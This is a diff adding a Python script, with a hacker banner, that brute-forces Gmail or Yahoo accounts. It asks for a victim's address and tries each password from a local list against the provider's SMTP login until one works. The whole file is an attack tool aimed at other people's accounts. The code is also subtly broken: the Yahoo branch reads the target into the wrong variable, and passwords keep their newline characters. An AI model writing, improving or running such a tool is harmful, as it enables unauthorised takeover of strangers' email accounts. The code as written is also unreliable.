@@ -1,0 +1,69 @@
+
+import smtplib
+import time
+from termcolor import *
+
+print(colored("""
+--  ███╗   ███╗ ██████╗       ██╗  ██╗ █████╗  ██████╗██╗  ██╗
+--  ████╗ ████║██╔═══██╗      ██║  ██║██╔══██╗██╔════╝██║ ██╔╝
+--  ██╔████╔██║██║   ██║█████╗███████║███████║██║     █████╔╝ 
+--  ██║╚██╔╝██║██║   ██║╚════╝██╔══██║██╔══██║██║     ██╔═██╗ 
+--  ██║ ╚═╝ ██║╚██████╔╝      ██║  ██║██║  ██║╚██████╗██║  ██╗
+--  ╚═╝     ╚═╝ ╚═════╝       ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
+--                                                            
+ ""","red"))
+print(colored("             ##############################","red"))
+print(colored("             [√] Codding By Mo Ashraf [√] #","blue"))
+print(colored("                        FB : Mo404","blue"))
+print(colored("             ##############################","green"))
+kind=input("enter the domin name(gmail,yahoo) : ")
+if kind=="gmail":
+	def brutgmail():
+		
+		s=smtplib.SMTP("smtp.gmail.com",587)
+		s.ehlo()
+		s.starttls()
+		
+		pwlist=open("/storage/emulated/0/passlist.txt","r")
+		pws=pwlist.readlines(1000000)
+	
+		
+		for ps in pws:	
+			try:
+				time.sleep(1)
+				s.login(uhack,ps)
+				
+				print("[+] Password found"+">>>"+ps)
+				break;
+			except:
+				print("[!] Password incorrect: "+ ps)
+	
+	uhack=input("\nenter the email you want to hack(gmail) : ")
+
+
+	brutgmail()
+
+if kind=="yahoo":
+	def brutyahoo():
+			
+			s=smtplib.SMTP("smtp.mail.yahoo.com",587)
+			s.ehlo()
+			s.starttls()
+			
+			pwlist=open("/storage/emulated/0/passlist.txt","r")
+			pws=pwlist.readlines(1000000)
+		
+			
+			for ps in pws:	
+				try:
+					time.sleep(1)
+					s.login(uhack,ps)
+					
+					print("[+] Password found"+">>>"+ps)
+					break;
+				except:
+					print("[!] Password incorrect: "+ ps)
+		
+	yhack=input("\nenter the email you want to hack(yahoo) : ")
+	brutyahoo()
+
